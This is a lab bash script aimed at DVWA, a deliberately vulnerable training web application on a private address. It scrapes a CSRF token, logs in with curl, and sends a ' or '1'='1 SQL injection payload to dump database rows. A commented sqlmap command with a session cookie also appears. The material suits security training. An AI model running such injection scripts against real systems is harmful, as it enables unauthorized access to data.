#vulnId.sh --> sqli.sh

#Variables
#URL=$URL
IP=$IP
SQLI_DIR=$SQLI_DIR'/'
SQLI_1=' or '1'='1
EXT='?id=1&Submit=Submit'
LOGIN_URL="http://192.168.40.145/DVWA/login.php/"
DVWA_USER=$USER
DVWA_PASS=$PASS

#sqlmap -u "${SQLI_DIR}?id=&Submit=Submit" --cookie="PHPSESSID=96uqh3mj23mg50vnn2uadsj5rj;security=low" --batch --drop-set-cookie

## Anti CSRF token
CSRF="$( curl -sc ~/Documents/DVWA/scripts/dvwa.cookie "$LOGIN_URL" | awk -F 'value=' '/user_token/ {print $2}' | cut -d "'" -f2 )"
sed -i '/security/d' ~/Documents/DVWA/scripts/dvwa.cookie

## Login to DVWA using cookie
curl -sb ~/Documents/DVWA/scripts/dvwa.cookie -d "username=${DVWA_USER}&password=${DVWA_PASS}&user_token=${CSRF}&Login=Login" "$LOGIN_URL" >/dev/null
[[ "$?" -ne 0 ]] && echo -e '\n[!] Issue connecting! #1' && exit 1

## Connect to server using cookie
    REQUEST="$( curl -sb 'security=low' -b ~/Documents/DVWA/scripts/dvwa.cookie "${SQLI_DIR}?username=${DVWA_USER}&password=${DVWA_PASS}&Login=login${EXT}" )"
    [[ $? -ne 0 ]] && echo -e '\n[!] Issue connecting! #2'    

#Display Success        
echo "${REQUEST}" | grep "Vulnerability: SQL Injection" | sed -e 's/^[ \t]*//'

#Attempt SQLi with DVWA'or'1'='1 
echo -e "\n---- Attempting SQLi using DVWA'or'1'='1 ----\n"
TEST1="$( curl -sb 'security=low' -b ~/Documents/DVWA/scripts/dvwa.cookie "${SQLI_DIR}?id=DVWA'or'1'='1&Submit=Submit" )"
    [[ $? -ne 0 ]] && echo -e '\n[!] Issue connecting! #2'

#Format output
echo "${TEST1}" | grep -o -P '(?<=pre).*(?=pre)' | sed -e 's/<br /\\\n/g' -e 's/pre><pre>/\\\n/g' -e 's/\\/ /g' -e 's/[/>]//g' -e 's/<//g'

export COUNT=3

/bin/bash ~/Documents/DVWA/scripts/vulnId.sh

#Clean up
#rm -r /root/.sqlmap/output/$IP
